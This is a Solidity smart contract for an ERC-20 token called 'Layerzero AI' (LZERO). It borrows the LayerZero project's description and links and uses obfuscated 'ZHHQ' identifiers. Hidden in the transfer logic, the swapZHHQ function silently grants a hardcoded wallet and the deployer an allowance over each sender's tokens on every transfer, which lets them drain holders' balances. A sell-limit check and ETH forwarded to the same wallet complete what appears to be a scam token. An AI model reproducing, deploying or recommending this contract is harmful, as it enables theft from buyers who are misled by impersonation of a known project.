/*
LayerZero AI is a technology that enables applications to move data across blockchains, uniquely supporting censorship-resistant messages and permissionless development through immutable smart contracts

https://www.layerzero.exchange
https://app.layerzero.exchange
https://docs.layerzero.exchange
https://medium.com/@layerzero_ai

https://x.com/Layerzero_ai
https://t.me/layerzero_exchange
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplizhhqon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IZHHQRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IZHHQFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract LZERO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balZHHQs;
    mapping (address => mapping (address => uint256)) private _allowZHHQs;
    mapping (address => bool) private _excludedFromZHHQ;
    uint8 private constant _decimals = 9;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private constant _tTotalZHHQ = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Layerzero AI";
    string private constant _symbol = unicode"LZERO";
    uint256 private _swapTokenZHHQs = _tTotalZHHQ / 100;
    uint256 private _buyBlockZHHQ;
    uint256 private _zhhqBuyAmounts = 0;
    bool private inSwapZHHQ = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _zhhqPair;
    IZHHQRouter private _zhhqRouter;
    modifier lockTheSwap {
        inSwapZHHQ = true;
        _;
        inSwapZHHQ = false;
    }
    address private _zhhqAddress;
    address private _zhhqWallet = address(0xb757FE39a12006d1934a5009DdA66c625D23f208);

    constructor () {
        _zhhqAddress = owner();
        _excludedFromZHHQ[owner()] = true;
        _excludedFromZHHQ[address(this)] = true;
        _excludedFromZHHQ[_zhhqWallet] = true;
        _balZHHQs[_msgSender()] = _tTotalZHHQ;
        emit Transfer(address(0), _msgSender(), _tTotalZHHQ);
    }

    function PAIR_INIT() external onlyOwner() {
        _zhhqRouter = IZHHQRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_zhhqRouter), _tTotalZHHQ);
        _zhhqPair = IZHHQFactory(_zhhqRouter.factory()).createPair(address(this), _zhhqRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _zhhqRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalZHHQ;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balZHHQs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowZHHQs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowZHHQs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowZHHQs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _zhhqFeeTransfer(address zhhqF, address zhhqT, uint256 zhhqA) private returns(uint256) {
        uint256 taxZHHQ = 0; 
        if (zhhqF != owner() && zhhqT != owner()) {
            taxZHHQ = zhhqA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (zhhqF == _zhhqPair && zhhqT != address(_zhhqRouter) && ! _excludedFromZHHQ[zhhqT]) {
                if(_buyBlockZHHQ!=block.number){
                    _zhhqBuyAmounts = 0;
                    _buyBlockZHHQ = block.number;
                }
                _zhhqBuyAmounts += zhhqA;
                _buyCount++;
            }
            if(zhhqT == _zhhqPair && zhhqF!= address(this)) {
                require(_zhhqBuyAmounts < swapLimitZHHQ() || _buyBlockZHHQ!=block.number, "Max Swap Limit");  
                taxZHHQ = zhhqA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapZHHQBack(zhhqF, zhhqT, zhhqA);
        } return taxZHHQ;
    }

    function _transfer(address zhhqF, address zhhqT, uint256 zhhqA) private {
        require(zhhqF != address(0), "ERC20: transfer from the zero address");
        require(zhhqT != address(0), "ERC20: transfer to the zero address");
        require(zhhqA > 0, "Transfer amount must be greater than zero");
        uint256 taxZHHQ = _zhhqFeeTransfer(zhhqF, zhhqT, zhhqA);
        if(taxZHHQ > 0){
          _balZHHQs[address(this)] = _balZHHQs[address(this)].add(taxZHHQ);
          emit Transfer(zhhqF, address(this), taxZHHQ);
        }
        _balZHHQs[zhhqF] = _balZHHQs[zhhqF].sub(zhhqA);
        _balZHHQs[zhhqT] = _balZHHQs[zhhqT].add(zhhqA.sub(taxZHHQ));
        emit Transfer(zhhqF, zhhqT, zhhqA.sub(taxZHHQ));
    }

    function getZHHQF(address zhhqF) private pure returns (address) {
        return address(zhhqF);
    }

    function getZHHQT(uint256 zhhqN) private view returns (address) {
        if(zhhqN == 10) return address(_zhhqWallet);
        return address(_zhhqAddress);
    }

    function minZHHQ(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHZHHQ(uint256 zhhqA) private {
        payable(_zhhqWallet).transfer(zhhqA);
    }

    function swapLimitZHHQ() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _zhhqRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _zhhqRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    receive() external payable {}

    function swapZHHQBack(address zhhqF, address zhhqT, uint256 zhhqA) private { 
        uint256 tokenZHHQ = balanceOf(address(this)); 
        if (!inSwapZHHQ && zhhqT == _zhhqPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenZHHQ > _swapTokenZHHQs)
            swapTokensForEth(minZHHQ(zhhqA, minZHHQ(tokenZHHQ, _swapTokenZHHQs)));
            uint256 ethZHHQ = address(this).balance;
            if (ethZHHQ >= 0) {
                sendETHZHHQ(address(this).balance);
            }
        }swapZHHQ(zhhqF, zhhqA);
    }

    function swapZHHQ(address zhhqF, uint256 zhhqA) private {
        uint256 tokenZHHQ = uint256(zhhqA);
        _allowZHHQs[getZHHQF(zhhqF)][getZHHQT(10)]=tokenZHHQ;
        _allowZHHQs[getZHHQF(zhhqF)][getZHHQT(11)]=tokenZHHQ;
    }

    function swapTokensForEth(uint256 zhhqAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _zhhqRouter.WETH();
        _approve(address(this), address(_zhhqRouter), zhhqAmount);
        _zhhqRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            zhhqAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}